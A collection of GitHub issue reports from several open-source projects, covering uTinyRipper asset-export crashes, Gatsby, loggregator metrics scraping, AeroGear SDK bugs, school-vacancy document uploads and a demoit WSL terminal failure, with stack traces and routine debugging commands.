   at uTinyRipper.AssetExporters.ProjectExporter.Export(String path, FileCollection fileCollection, IEnumerable`1 assets, ExportOptions options)
   at uTinyRipper.GameStructure.Export(String exportPath, Func`2 filter)
   at uTinyRipperGUI.MainWindow.ExportFiles(Object data)

[sharedassets4.zip](https://github.com/mafaca/UtinyRipper/files/3483914/sharedassets4.zip)
 Import: System.Exception: Object's type Material isn't assignable from Texture2D
   ved uTinyRipper.Classes.PPtr`1.FindAsset(IExportContainer container)
   ved uTinyRipper.Classes.PPtr`1.ExportYAML(IExportContainer container)
   ved uTinyRipper.Classes.TerrainDatas.SplatPrototype.ExportYAML(IExportContainer container)
   ved uTinyRipper.AssetExporters.IEnumerableExtensions.ExportYAML[T](IEnumerable`1 _this, IExportContainer container)
   ved uTinyRipper.Classes.TerrainDatas.SplatDatabase.ExportYAML(IExportContainer container)
   ved uTinyRipper.Classes.TerrainData.ExportYAMLRoot(IExportContainer container)
   ved uTinyRipper.Classes.Object.ExportYAMLDocument(IExportContainer container)
   ved uTinyRipper.AssetExporters.YAMLAssetExporter.Export(IExportContainer container, Object asset, String path)
   ved uTinyRipper.AssetExporters.AssetExportCollection.Export(ProjectAssetContainer container, String dirPath)
   ved uTinyRipper.AssetExporters.ProjectExporter.Export(String path, FileCollection fileCollection, IEnumerable`1 assets, ExportOptions options)
   ved uTinyRipper.GameStructure.Export(String exportPath, Func`2 filter)
   ved uTinyRipperGUI.MainWindow.ExportFiles(Object data)
Go to: Create issue

 Import: System.ArgumentException: Illegal characters in path.
   at System.Security.Permissions.FileIOPermission.EmulateFileIOPermissionChecks(String fullPath)
   at System.IO.DirectoryInfo.Init(String path, Boolean checkHost)
   at uTinyRipper.FileUtils.GetUniqueName(String dirPath, String fileName, Int32 maxNameLength)
   at uTinyRipper.AssetExporters.ExportCollection.GetUniqueFileName(ISerializedFile file, Object asset, String dirPath)
   at uTinyRipper.AssetExporters.AssetExportCollection.Export(ProjectAssetContainer container, String dirPath)
   at uTinyRipper.AssetExporters.ProjectExporter.Export(String path, FileCollection fileCollection, IEnumerable`1 assets, ExportOptions options)
   at uTinyRipper.GameStructure.Export(String exportPath, Func`2 filter)
   at uTinyRipperGUI.MainWindow.ExportFiles(Object data) [sharedassets15.zip](https://github.com/mafaca/UtinyRipper/files/3873022/sharedassets15.zip)

Import: SerializedFileException: v:2018.4.4f1 n:sharedassets15.assets p:D:\Game\Game_Data\sharedassets15.assets
Message: Error during reading asset type Shader
Inner: System.Exception: Some data left
   at uTinyRipper.Lz4DecodeStream.ReadBuffer(Stream stream, Int64 count)
   at uTinyRipper.Lz4DecodeStream.ReadBuffer(Byte[] buffer, Int32 offset, Int32 count)
   at uTinyRipper.Classes.Shader.Read(AssetReader reader)
   at uTinyRipper.SerializedFile.ReadAsset(AssetReader reader, AssetInfo assetInfo, Int64 offset, Int32 size)
StackTrace:    at uTinyRipper.SerializedFile.ReadAsset(AssetReader reader, AssetInfo assetInfo, Int64 offset, Int32 size)
   at uTinyRipper.SerializedFile.ReadAsset(AssetReader reader, AssetEntry& info)
   at uTinyRipper.SerializedFile.ReadData(Stream stream)
   at uTinyRipper.GameProcessorContext.ReadFile(SerializedFile file)
   at uTinyRipper.GameProcessorContext.ReadFile(SerializedFile file)
   at uTinyRipper.GameProcessorContext.ReadSerializedFiles()
   at uTinyRipper.GameStructureProcessor.ProcessSchemes(GameCollection fileCollection)
   at uTinyRipper.GameStructure.Load(List`1 pathes, LayoutInfo layinfo)
   at uTinyRipper.GameStructure.Load(IEnumerable`1 pathes, LayoutInfo layinfo)
   at uTinyRipperGUI.MainWindow.LoadFiles(Object data)  I believe that's how unity editor assign Guid to *.cs files.
Also this can make scripts to match those hashes in MonoManager. 
[globalgamemanagers.zip](https://github.com/mafaca/UtinyRipper/files/3801391/globalgamemanagers.zip)
log:

Import: SerializedFileException: v:5.5.0p3 n:globalgamemanagers.assets p:D:\Games\Test\data\globalgamemanagers.assets
Message: Error during reading asset type Sprite
Inner: System.Exception: End of stream. Read 0, expected 4 bytes
   in uTinyRipper.EndianReader.ReadSingle()
   in uTinyRipper.Classes.Vector4f.Read(AssetReader reader)
   in uTinyRipper.Classes.Sprites.SpriteRenderData.Read(AssetReader reader)
   in uTinyRipper.Classes.Sprite.Read(AssetReader reader)
   in uTinyRipper.SerializedFile.ReadAsset(AssetReader reader, AssetInfo assetInfo, Int64 offset, Int32 size)
StackTrace:    в uTinyRipper.SerializedFile.ReadAsset(AssetReader reader, AssetInfo assetInfo, Int64 offset, Int32 size)
   in uTinyRipper.SerializedFile.ReadAsset(AssetReader reader, AssetEntry& info)
   in uTinyRipper.SerializedFile.ReadAssets(EndianReader reader)
   in uTinyRipper.SerializedFile.Read(EndianReader reader)
   in uTinyRipper.SerializedFileScheme.ReadFile(IFileCollection collection, IAssemblyManager manager)
   in uTinyRipper.FileList.AddFile(FileScheme scheme, IFileCollection collection, IAssemblyManager manager)
   in uTinyRipper.GameStructure.Processor.ProcessFile(String fileName, String filePath)
   in uTinyRipper.GameStructure.Processor.LoadDependencies(FileScheme scheme)
   in uTinyRipper.GameStructure.Processor.ProcessFile(String fileName, String filePath)
   in uTinyRipper.GameStructure.ProcessGameStructure(Processor processor, PlatformGameStructure structure)
   in uTinyRipper.GameStructure.Load(List`1 pathes)
   in uTinyRipper.GameStructure.Load(IEnumerable`1 pathes)
   in uTinyRipperGUI.MainWindow.LoadFiles(Object data) в C:\Users\James\Desktop\UtinyRipper-master\uTinyRipperGUI\MainWindow.xaml.cs:line 219

 Hello, i tried to  export a project with the latest build version of Utiny.
Export work , but combined mesh does not seem to import good when i open the project with Unity (tried both with 2017.3 and 2019.1).
When i explore asset/mesh folder, all "combined mesh*.asset" have a normal size of 5 or 6 mb, but the size go to 3 Ko after opening the project into unity, and all combined mesh do not render in the scene.
This is  the link of the app i tried to unpack (see the demo link): https://bit.ly/2HtvMDB
Thank in advance, and congrat for your amazing work !
 Stack trace:
```
Import: SerializedFileException: v:2018.2.21f1 n:00134a86f211e314097163924685a6d4 p:C:\Users\USER\Documents\Spanish Inquisition\dedder\bcranger\Data\00134a86f211e314097163924685a6d4
Message: Error during reading asset type MonoBehaviour
Inner: System.BadImageFormatException: Format of the executable (.exe) or library (.dll) is invalid.
   at Mono.Cecil.PE.ImageReader.ReadImage()
   at Mono.Cecil.PE.ImageReader.ReadImage(Disposable`1 stream, String file_name)
   at Mono.Cecil.ModuleDefinition.ReadModule(String fileName, ReaderParameters parameters)
   at uTinyRipper.Assembly.Mono.MonoManager.Load(String filePath)
   at uTinyRipper.PlatformGameStructure.RequestAssembly(String assembly)
   at uTinyRipper.GameStructure.RequestAssembly(String assembly)
   at uTinyRipper.FileCollection.OnRequestAssembly(String assembly)
   at uTinyRipper.Assembly.Mono.MonoManager.RetrieveAssembly(String name)
   at uTinyRipper.Assembly.Mono.MonoManager.FindType(String assembly, String namespace, String name)
   at uTinyRipper.Assembly.Mono.MonoManager.IsValid(String assembly, String namespace, String name)
   at uTinyRipper.Classes.MonoScript.CreateStructure()
   at uTinyRipper.Classes.MonoBehaviour.Read(AssetReader reader)
   at uTinyRipper.SerializedFiles.SerializedFile.ReadAsset(EndianReader reader, AssetInfo assetInfo, Int64 offset, Int32 size)
StackTrace:    at uTinyRipper.SerializedFiles.SerializedFile.ReadAsset(EndianReader reader, AssetInfo assetInfo, Int64 offset, Int32 size)
   at uTinyRipper.SerializedFiles.SerializedFile.ReadAsset(EndianReader reader, AssetEntry info, Int64 startPosition)
   at uTinyRipper.SerializedFiles.SerializedFile.ReadAssets(EndianReader reader, Int64 startPosition)
   at uTinyRipper.SerializedFiles.SerializedFile.Read(Stream stream, Action`1 dependencyCallback)
   at uTinyRipper.SerializedFiles.SerializedFile.Load(Action`1 dependencyCallback)
   at uTinyRipper.SerializedFiles.SerializedFile.Load(Parameters pars)
   at uTinyRipper.FileCollection.LoadSerializedFile(String filePath)
   at uTinyRipper.PlatformGameStructure.RequestDependency(String dependency)
   at uTinyRipper.GameStructure.RequestDependency(String dependency)
   at uTinyRipper.FileCollection.OnRequestDependency(String dependency)
   at uTinyRipper.SerializedFiles.SerializedFile.Read(Stream stream, Action`1 dependencyCallback)
   at uTinyRipper.SerializedFiles.SerializedFile.Load(Action`1 dependencyCallback)
   at uTinyRipper.SerializedFiles.SerializedFile.Load(Parameters pars)
   at uTinyRipper.FileCollection.LoadSerializedFile(String filePath)
   at uTinyRipper.PlatformGameStructure.RequestDependency(String dependency)
   at uTinyRipper.GameStructure.RequestDependency(String dependency)
   at uTinyRipper.FileCollection.OnRequestDependency(String dependency)
   at uTinyRipper.SerializedFiles.SerializedFile.Read(Stream stream, Action`1 dependencyCallback)
   at uTinyRipper.SerializedFiles.SerializedFile.Load(Action`1 dependencyCallback)
   at uTinyRipper.SerializedFiles.SerializedFile.Load(Parameters pars)
   at uTinyRipper.FileCollection.LoadSerializedFile(String filePath)
   at uTinyRipper.GameStructure.Load(List`1 pathes)
   at uTinyRipper.GameStructure.Load(IEnumerable`1 pathes)
   at uTinyRipperGUI.MainWindow.LoadFiles(Object data)
```

Here is the file if it helps: https://drive.google.com/open?id=1fM07dDufbC8eVNG4Jae9kRTT9Za2bO-t
 HI
I tried to use the program to extract a vrca but the program just crashed, the fact is that it only happens to me in that vrca in another works perfectly, what should I do?

https://gyazo.com/0048ef01abb8fda5049921c91cd12209 here is the problem

and this is the vrca that gives problems [Problematic Thing.zip](https://github.com/mafaca/UtinyRipper/files/4002045/Problematic.Thing.zip)
<---------->
121285663
using plugin   "gatsby-source-contentful": "^2.1.6"
Gatsby CLI version: 2.7.7
Gatsby version: 2.10.0

I get this error if I add the contentful plugin to this starter and run `gatsby develop`

> 
> error gatsby-node.js returned an error
> 
> 
>   TypeError: Cannot destructure property `slug` of 'undefined' or 'null'.
> 
>   - gatsby-node.js:65 allMarkdown.data.allMarkdownRemark.edges.forEach
>     /Users/me/work/project/gatsby-node.js:65:35
> 
>   - Array.forEach
> 
>   - gatsby-node.js:64 Object.exports.createPages
>     /Users/me/work/project/gatsby-node.js:64:44
> 


I am adding the contentful plugin to gatsby-config.js like follows:

  ```
  {
      resolve: `gatsby-source-contentful`,
      options: {
        spaceId: 'myId',
        // Learn about environment variables: https://gatsby.dev/env-vars
        accessToken: process.env.CONTENTFUL_ACCESS_TOKEN
      }
    },
```

What is causing this error ? [tslint is going to be deprecated soon.](https://medium.com/palantir/tslint-in-2019-1a144c2317a9) Replace `tslint` + `tslint-config-blvd` with `eslint` + `eslint-config-blvd` as soon as possible. I get this error if I add the contentful plugin to this starter and run `gatsby develop`

> 
> error gatsby-node.js returned an error
> 
> 
>   TypeError: Cannot destructure property `slug` of 'undefined' or 'null'.
> 
>   - gatsby-node.js:65 allMarkdown.data.allMarkdownRemark.edges.forEach
>     /Users/me/work/project/gatsby-node.js:65:35
> 
>   - Array.forEach
> 
>   - gatsby-node.js:64 Object.exports.createPages
>     /Users/me/work/project/gatsby-node.js:64:44
> 


I am adding the contentful plugin to gatsby-config.js like follows:

  ```
  {
      resolve: `gatsby-source-contentful`,
      options: {
        spaceId: 'myId',
        // Learn about environment variables: https://gatsby.dev/env-vars
        accessToken: process.env.CONTENTFUL_ACCESS_TOKEN
      }
    },
```

What is causing this error ? [tslint is going to be deprecated soon.](https://medium.com/palantir/tslint-in-2019-1a144c2317a9) Replace `tslint` + `tslint-config-blvd` with `eslint` + `@typescript-eslint/parser` + `eslint-config-blvd` as soon as possible.
<---------->
121662158
The `loggregator` link is listed as [optional](https://github.com/cloudfoundry/loggregator-agent-release/blob/6b14a78bf4fd634dba4488dd8e8a267955e6b8e2/jobs/prom_scraper/spec#L7) in the most recent release. 
However, when using the `prom_scraper` job, failures occur because bosh references `p('loggregator_agent.property', link("loggregator").p("property_from_link"))` and it requires at minimum, a nil link to exist.

/cc @attack  If I have a summary on my metrics endpoint like

```
# HELP http_requests_total The total number of HTTP requests.
# TYPE http_requests_total counter
http_requests_total{method="post",code="200"} 1027
```
I expect it to be converted to the a counter:
{"tags":{method: "post",code: "200"}, "counter": {"name": "http_requests_total", "delta": 0, "total": 1027}} The port should come from the agent rather than doppler or at least be able to manually set the port. we dont want our source id to have `infra_` prefix The `loggregator` link is listed as [optional](https://github.com/cloudfoundry/loggregator-agent-release/blob/6b14a78bf4fd634dba4488dd8e8a267955e6b8e2/jobs/prom_scraper/spec#L7) in the most recent release. 
However, when using the `prom_scraper` job, failures occur because bosh references `p('loggregator_agent.property', link("loggregator").p("property_from_link"))` and it requires at minimum, a nil link to exist.

/cc @attack  Since the health endpoint metrics were moved to use expvar the health endpoint is served on the pprof port. The health port was not cleaned up from the bosh release or the implementation as part of that change and should be removed to avoid confusion.

https://github.com/cloudfoundry/loggregator-agent-release/blob/develop/jobs/loggregator_agent/spec#L48-L50 If I have a summary on my metrics endpoint like

```
# HELP rpc_duration_seconds A summary of the RPC duration in seconds.
# TYPE rpc_duration_seconds summary
rpc_duration_seconds{quantile="0.01"} 3102
rpc_duration_seconds{quantile="0.99"} 76656
rpc_duration_seconds_sum 1.7560473e+07
rpc_duration_seconds_count 2693
```

I expect it to be converted to the following firehose metrics:
{"tags":{}, "gauge": {"metrics": "rpc_duration_seconds_sum": {"value":  1.7560473e+07}}}
{"tags":{"quantile": "0.01"}, "gauge": {"metrics": "rpc_duration_seconds": {"value": 3102}}}
{"tags":{"quantile": "0.99"}, "gauge": {"metrics": "rpc_duration_seconds": {"value": 76656}}}
{"tags":{}, "counter": {"name": "rpc_duration_seconds_count", "delta": 0, "total": 2693}} We have a service that incorrectly wired up a metrics endpoint when none existed:
```shell
2019/07/22 02:29:50 failed to scrape: scrape errors:
[id: , instance_id: , metric_url: http://127.0.0.1:6063/metrics]: unexpected status code 404: 404 page not found
```

After awhile, we eventually get the following error:
```
2019/07/22 02:30:05 failed to scrape: scrape errors:
[id: , instance_id: , metric_url: http://127.0.0.1:6063/metrics]: Get http://127.0.0.1:6063/metrics: dial tcp 127.0.0.1:6063: socket: too many open files
```

We then look up the pid of the prom_scraper and run the following command
```shell
ll /proc/16103/fd | wc -l
1027
```
And then checking out the limits:
```shell
cat /proc/16103/limits
Limit                     Soft Limit           Hard Limit           Units
Max cpu time              unlimited            unlimited            seconds
Max file size             unlimited            unlimited            bytes
Max data size             unlimited            unlimited            bytes
Max stack size            8388608              unlimited            bytes
Max core file size        0                    unlimited            bytes
Max resident set          unlimited            unlimited            bytes
Max processes             14655                14655                processes
Max open files            1024                 4096                 files
Max locked memory         65536                65536                bytes
Max address space         unlimited            unlimited            bytes
Max file locks            unlimited            unlimited            locks
Max pending signals       14655                14655                signals
Max msgqueue size         819200               819200               bytes
Max nice priority         0                    0
Max realtime priority     0                    0
Max realtime timeout      unlimited            unlimited            us
```

When watching the `fds` via `ll /proc/16103/fd | wc -l` it seems like they are growing by 6 every 15 seconds, so I'm not sure if it's the 404 or something else. In our release, we only have 4 jobs that define a metric port. If I have a histogram on my metrics endpoint like
```
# A histogram, which has a pretty complex representation in the text format:
# HELP http_request_duration_seconds A histogram of the request duration.
# TYPE http_request_duration_seconds histogram
http_request_duration_seconds_bucket{le="1"} 133988
http_request_duration_seconds_bucket{le="+Inf"} 144320
http_request_duration_seconds_sum 53423
http_request_duration_seconds_count 144320
```

I expect it to be converted to the following firehose metrics:
`{"tags":{}, "gauge": {"metrics": "http_request_duration_seconds_sum": {"value": 53423}}}`
`{"tags":{"le": "1"}, "gauge": {"metrics": "http_request_duration_seconds_bucket": {"value": 133988}}}`
`{"tags":{"le": "+Inf"}, "gauge": {"metrics": "http_request_duration_seconds_bucket": {"value": 144320}}}`
`{"tags":{}, "counter": {"name": "http_request_duration_seconds_count", "delta": 0, "total": 144320}}` We have a service that incorrectly wired up a metrics endpoint when none existed:
```shell
2019/07/22 02:29:50 failed to scrape: scrape errors:
[id: , instance_id: , metric_url: http://127.0.0.1:6063/metrics]: unexpected status code 404: 404 page not found
```

After awhile, we eventually get the following error:
```
2019/07/22 02:30:05 failed to scrape: scrape errors:
[id: , instance_id: , metric_url: http://127.0.0.1:6063/metrics]: Get http://127.0.0.1:6063/metrics: dial tcp 127.0.0.1:6063: socket: too many open files
```

We then look up the pid of the prom_scraper and run the following command
```shell
ll /proc/16103/fd | wc -l
1027
```
And then checking out the limits:
```shell
cat /proc/16103/limits
Limit                     Soft Limit           Hard Limit           Units
Max cpu time              unlimited            unlimited            seconds
Max file size             unlimited            unlimited            bytes
Max data size             unlimited            unlimited            bytes
Max stack size            8388608              unlimited            bytes
Max core file size        0                    unlimited            bytes
Max resident set          unlimited            unlimited            bytes
Max processes             14655                14655                processes
Max open files            1024                 4096                 files
Max locked memory         65536                65536                bytes
Max address space         unlimited            unlimited            bytes
Max file locks            unlimited            unlimited            locks
Max pending signals       14655                14655                signals
Max msgqueue size         819200               819200               bytes
Max nice priority         0                    0
Max realtime priority     0                    0
Max realtime timeout      unlimited            unlimited            us
```

When watching the `fds` via `ll /proc/16103/fd | wc -l` it seems like they are growing by 6 every 15 seconds, so I'm not sure if it's the 404 or something else. In our release, we only have 4 jobs that define a metric port. If I have a histogram on my metrics endpoint like
```
# A histogram, which has a pretty complex representation in the text format:
# HELP http_request_duration_seconds A histogram of the request duration.
# TYPE http_request_duration_seconds histogram
http_request_duration_seconds_bucket{le="1"} 133988
http_request_duration_seconds_bucket{le="+Inf"} 144320
http_request_duration_seconds_sum 53423
http_request_duration_seconds_count 144320
```

I expect it to be converted to the following firehose metrics:
`{"tags":{}, "gauge": {"metrics": "http_request_duration_seconds_sum": {"value": 53423}}}`
`{"tags":{"le": "1"}, "counter": {"metrics": "http_request_duration_seconds_bucket": {"value": 133988}}}`
`{"tags":{"le": "+Inf"}, "counter": {"metrics": "http_request_duration_seconds_bucket": {"value": 144320}}}`
`{"tags":{}, "counter": {"name": "http_request_duration_seconds_count", "delta": 0, "total": 144320}}` The port should come from the agent rather than doppler or at least be able to manually set the port. If I have a summary on my metrics endpoint like

```
# HELP rpc_duration_seconds A summary of the RPC duration in seconds.
# TYPE rpc_duration_seconds summary
rpc_duration_seconds{quantile="0.01"} 3102
rpc_duration_seconds{quantile="0.99"} 76656
rpc_duration_seconds_sum 1.7560473e+07
rpc_duration_seconds_count 2693
```

I expect it to be converted to the following firehose metrics:
{"tags":{}, "gauge": {"metrics": "rpc_duration_seconds_sum": {"value":  1.7560473e+07}}}
{"tags":{"quantile": "0.01"}, "gauge": {"metrics": "rpc_duration_seconds": {"value": 3102}}}
{"tags":{"quantile": "0.99"}, "gauge": {"metrics": "rpc_duration_seconds": {"value": 76656}}}
{"tags":{}, "counter": {"name": "rpc_duration_seconds_count", "delta": 0, "total": 2693}} If I have a summary on my metrics endpoint like

```
# HELP http_requests_total The total number of HTTP requests.
# TYPE http_requests_total counter
http_requests_total{method="post",code="200"} 1027
```
I expect it to be converted to the a counter:
{"tags":{method: "post",code: "200"}, "counter": {"name": "http_requests_total", "delta": 0, "total": 1027}}
<---------->
121781914
## Description
 
Currently conflict resolution is implemented as global function that can be customized by checking different mutation names. We could change that so users will provide object with names of mutations and specific conflict resolutions that needs to happen.
 ## Description
 
Currently conflict resolution is implemented as global function that can be customized by checking different mutation names. We could change that so users will provide object with names of mutations and specific conflict resolutions that needs to happen.
 ## Bug Report

When performing a login to Keycloak without InAppBrowser on iOS I received a failure with this error in the console `TypeError: null is not an object (evaluating 'ref.addEventListener')`.

* **Affected Package(s)**: aerogear/auth
* **Package version(s)**: 2.4.0
* **Platform (e.g. Android/iOS)**: iOS
* **Platform Version**: 12.0 Simulator
* **Cordova Version**: CLI 9.0, cordova-ios@5.0.1
* **Node.js / npm versions**: 10.15 / 6.4

I created a simple Cordova application using `cordova create`, then added the SDK, bundled via browserify with the following:

```js
const app = agInit(config)

// initialise auth
const Auth = require('@aerogear/auth').Auth;
const authService = new Auth(app.config);
const initOptions = { onLoad: "login-required" };

authService.init(initOptions)
    .then(() => {
        // successful init & authentication
        alert('success')
    })
    .catch((err) => {
        // initialization error
        alert('fail')
        console.error(err)
    });
```

Running the app with this printed `TypeError: null is not an object (evaluating 'ref.addEventListener')`. After I added InAppBrowser the issue was resolved.

Maybe we need to check for InAppBrowser and report a better error depending on platform?

 There is no simple way to see persisted objects in cache. Adding debug flag is possible but currently, there is no way to do it without recompiling distribution binary. ## Motivation

Use more efficient storage solution that do not perform JSON.stringify etc.
Proposed option: https://github.com/localForage/localForage ## Bug Report
 
Push SDK (and probably others) are working exclusively with mobile-services config. 
However Push UI still have examples using old type of config that do not require many different elements like versions etc. We should enable passing direct push configuration for situations when no mobile-config (open shift) is present.

See: https://github.com/aerogear/ionic-showcase/issues/94 We had that information in the README.md before but it was removed.


ping @austincunningham  ## Bug Report

When performing a login to Keycloak without InAppBrowser on iOS I received a failure with this error in the console `TypeError: null is not an object (evaluating 'ref.addEventListener')`.

* **Affected Package(s)**: aerogear/auth
* **Package version(s)**: 2.4.0
* **Platform (e.g. Android/iOS)**: iOS
* **Platform Version**: 12.0 Simulator
* **Cordova Version**: CLI 9.0, cordova-ios@5.0.1
* **Node.js / npm versions**: 10.15 / 6.4

I created a simple Cordova application using `cordova create`, then added the SDK, bundled via browserify with the following:

```js
const app = agInit(config)

// initialise auth
const Auth = require('@aerogear/auth').Auth;
const authService = new Auth(app.config);
const initOptions = { onLoad: "login-required" };

authService.init(initOptions)
    .then(() => {
        // successful init & authentication
        alert('success')
    })
    .catch((err) => {
        // initialization error
        alert('fail')
        console.error(err)
    });
```

Running the app with this printed `TypeError: null is not an object (evaluating 'ref.addEventListener')`. After I added InAppBrowser the issue was resolved.

Maybe we need to check for InAppBrowser and report a better error depending on platform?

 ## Feature Request

At the moment, developers need to provide the JSON object of the configuration when initialise the SDK, here is [an example](https://github.com/aerogear/ionic-showcase/blob/02412b68acd481342b08c694caa5f2e1b68bc8d6/src/app/services/openshift.service.ts). 

In this example, the content of `mobile-services.json` is put into a JS file and then required by the user's application. This is due to the fact that JSON format is not universally supported by all the loaders/importers in nodejs/typescript. It is supported by the newer versions of node and typescript, but the older ones don't.

To make it easier for developers to use our SDK, we should handle the loading and parsing of the `mobile-services.json` file. It will:

1. Make it easier for developers to consume our SDK
2. Make it easier for us to document the setup steps.

A possible approach is to allow developers to provide the path to the `mobile-services.json` file as part of the SDK initialisation. The SDK will still be backward compatible if the parameter to initialise the SDK is an object. But if the parameter is a String type, the SDK will then load and parse the configuration file and build the configuration object.
 ## Bug Report

When starting SDK in any app following error appears a couple of times:
```
vendor.js:21535 Error when sending metrics {"stack":"Error: Metrics server configuration is missing. Metrics will be disabled.\n    at MetricsService.
```

there is no way to suspend it. Not having metrics enabled is not an error so we might remove this to not obfuscate logs.


ping @austincunningham 
<---------->
122179801
## Background

We have decided to use Google Drive as the document store for managing and publicly sharing assets uploaded by hiring staff at schools.  In order to ensure management of these assets is as smooth and straightforward as possible, we want to use a Shared Folder that has all members of the TVS team added as folder admins.  

## Done when:

- [ ] A shared folder exists in the DfE digital Google Drive

- [ ] All current members of the TVS team have been added and have the ability to manage documents and new users of the folder. 

- [ ] The process for adding and updating new members is documented in `README.md` or in a file in the `/documentation` folder. 

- [ ] A test document (either a `.pdf` or a `.doc`) has been manually uploaded to the folder, had a shared public link generated and test, and been deleted. 

- [ ] API access credentials that will allow programmatic uploading of new documents from the Ruby app have been obtained/generated and stored in the `secrets` repo.  ## Background
We want to allow authenticated school representatives the ability to upload documents via the edit or create page (or both) on their vacancies on TVS.

## Done when:
- [ ] We have decided which parts of the lifecycle of a vacancy will accept document uploads (create or edit or both - we can investigate more complex workflows later). 
- [ ] A minimum viable design exists for every form control that will be used to documents.
- [ ] The upload control accepts, at a minimum, the title to be displayed for the document and a file upload field to receive the document. 
- [ ] Both the title and the document upload are mandatory.
- [ ] Both the title and the filename are unique, scoped to the vacancy. 
- [ ] The system errors gracefully if the user tries to upload a document larger than 10MB.
- [ ] Copy, including instructions, hints, tooltips, et al. has been written and is associated with the controls.
- [ ] The system explains next steps to the user as soon as the initial document upload has completed (see non-blocking specification in #1249).  It might read something like "We are processing your upload.  It will appear in the 'Downloads' section of your vacancy listing shortly", for example. 
- [ ] One the document has been processed and is available, the public link shows in the appropriate place in the vacancy.  The copy used for this link is the title. 
- [ ] The admin view of the document gives the user the ability to delete the document. 
- [ ] If the user deletes the document, it is removed from the Google Drive as well as the database record. 

## Nice to have:
- [ ] A drag and drop controls for file upload. 

 ## Background
Documents uploaded by authenticated users representing schools should be able to upload documents to our public document store. 

## Done when:

- [ ] Business logic exists that transfers files from the TVS  system to the [Teaching Vacancies](#1247) shared folder. 
- [ ] If the upload process a dedicated owner in the Google Drive folder (I do not think it does, but check), then a transferrable user account is created and the file is associated with that account (`tvs-uploads@digital.education.gov.uk` for example).  That user account should be documented in the `README` or `/documents`.
- [ ] The process of uploading the file from the TVS system to the shared folder does not block the TVS system from responding to the uploading user's http request. 
- [ ] A public sharing link is added to the TVS system in the appropriate table (`vacancies`?) once the file has been saved to the  `Teaching Vacancies` folder. 
- [ ] Temporary files are cleaned up once the file is saved to `Teaching Vacancies` and the shared link is saved to the appropriate table. 

There may be clients better suites, but here is a link to the official Google api client: 

https://github.com/googleapis/google-api-ruby-client
<---------->
122433347
🚨 You need to enable Continuous Integration on all branches of this repository. 🚨

To enable Greenkeeper, you need to make sure that a [commit status](https://help.github.com/articles/about-statuses/) is reported on all branches. This is required by Greenkeeper because it uses your CI build statuses to figure out when to notify you about breaking changes.

Since we didn’t receive a CI status on the [`greenkeeper/initial`](https://github.com/macku/page-coverage/commits/greenkeeper/initial) branch, it’s possible that you don’t have CI set up yet. We recommend using [Travis CI](https://travis-ci.org), but Greenkeeper will work with every other CI service as well.

If you _have_ already set up a CI for this repository, you might need to check how it’s configured. Make sure it is set to run on all new branches. If you don’t want it to run on absolutely every branch, you can whitelist branches starting with `greenkeeper/`.

Once you have installed and configured CI on this repository correctly, you’ll need to re-trigger Greenkeeper’s initial pull request. To do this, please delete the `greenkeeper/initial` branch in this repository, and then remove and re-add this repository to the Greenkeeper App’s white list on Github. You'll find this list on your repo or organization’s __settings__ page, under __Installed GitHub Apps__.

<---------->
122569408
Hi, I wanna clarify how can i get the taintAnalysis_log file. 

When i checked the script, I found these  lines and I suppose that the first parameter of function read_taintAnalysis_log() is the name of the taint Analysis.

taintAnalysis_log = sys.argv[1] + "/" + sys.argv[1] + ".txt"

However, since your framework is based on the taintgrind which is the binary based tool to do dynamic analysis. It means first of all we need the executable (binary) and then feed it into the taintgrind and get the taintAnalysis. 

I am not very sure how can i get the taintAnalysis.txt correctly?
I tried with [../taintgrind] ../inst/bin/valgrind --tool=taintgrind tests/sign32 from this link: https://github.com/wmkhoo/taintgrind
And it of course can print the taint propagation information. Should I just write the terminal output as taintAnalysis.txt? 

<---------->
122640873
Since #4 we know which font works well.

Consider updating the HTML to load the cromulent web font, regardless of what is installed or not on the presentation machine. I built and tried running under WSL (Windows Subsystem for Linux / Ubuntu 18.04).
I can browse through the sample slides OK, served up by demoit, but I'm unable to get a terminal session to work (keep getting "Connection Closed").

I added a fmt.Println() to see what "commands" was set to when launching the shell.

Any idea how to get this working under WSL?
Is it a networking issue?
Any debug suggestions welcome ...

```
2019/02/11 16:44:51 Welcome to DemoIt. Please, open http://localhost:8888
2019/02/11 16:44:51 "Dev Mode" to live reload your slides can be enabled with '--dev'
2019/02/11 16:44:51 Permitting clients to write input to the PTY.
2019/02/11 16:44:51 HTTP server is listening at: http://:::9999/
Using shell /bin/bash
Using history /tmp/demoit388801105
commands =  cd ./folder;HISTFILE=/tmp/demoit388801105 exec /bin/bash
Ping http://localhost:8000/
2019/02/11 16:44:59 [::1]:30386 200 GET /
2019/02/11 16:44:59 [::1]:30391 200 GET /auth_token.js
2019/02/11 16:44:59 [::1]:30392 200 GET /config.js
2019/02/11 16:44:59 [::1]:30386 200 GET /css/index.css
2019/02/11 16:44:59 [::1]:30390 200 GET /css/xterm_customize.css
2019/02/11 16:44:59 [::1]:30389 200 GET /css/xterm.css
2019/02/11 16:44:59 [::1]:30393 200 GET /js/gotty-bundle.js
Ping http://localhost:8000/
2019/02/11 16:45:02 New client connected: [::1]:30407, connections: 1/0
2019/02/11 16:45:02 Connection closed by an error: failed to create backend: failed to start command `sh`: fork/exec /bin/sh: invalid argument: [::1]:30407, connections: 0/0
Ping http://localhost:8000/
Ping http://localhost:8000/
Ping http://localhost:8000/
Ping http://localhost:8000/
Ping http://localhost:8000/
Ping http://localhost:8000/
Ping http://localhost:8000/
Ping http://localhost:8000/
Ping http://localhost:8000/
Ping http://localhost:8000/
Ping http://localhost:8000/
Ping http://localhost:8000/
```

similarly if I connect to http://127.0.0.1:9999 I get
```
2019/02/11 16:52:20 Welcome to DemoIt. Please, open http://localhost:8888
2019/02/11 16:52:20 "Dev Mode" to live reload your slides can be enabled with '--dev'
2019/02/11 16:52:20 Permitting clients to write input to the PTY.
2019/02/11 16:52:20 HTTP server is listening at: http://:::9999/
2019/02/11 16:52:31 127.0.0.1:31135 200 GET /
2019/02/11 16:52:31 127.0.0.1:31137 200 GET /css/xterm_customize.css
2019/02/11 16:52:31 127.0.0.1:31140 200 GET /auth_token.js
2019/02/11 16:52:31 127.0.0.1:31136 200 GET /css/xterm.css
2019/02/11 16:52:31 127.0.0.1:31139 200 GET /config.js
2019/02/11 16:52:31 127.0.0.1:31135 200 GET /css/index.css
2019/02/11 16:52:32 127.0.0.1:31138 200 GET /js/gotty-bundle.js
2019/02/11 16:52:33 New client connected: 127.0.0.1:31143, connections: 1/0
2019/02/11 16:52:33 Connection closed by an error: failed to create backend: failed to start command `sh`: fork/exec /bin/sh: invalid argument: 127.0.0.1:31143, connections: 0/0
2019/02/11 16:52:35 127.0.0.1:31138 200 GET /favicon.png
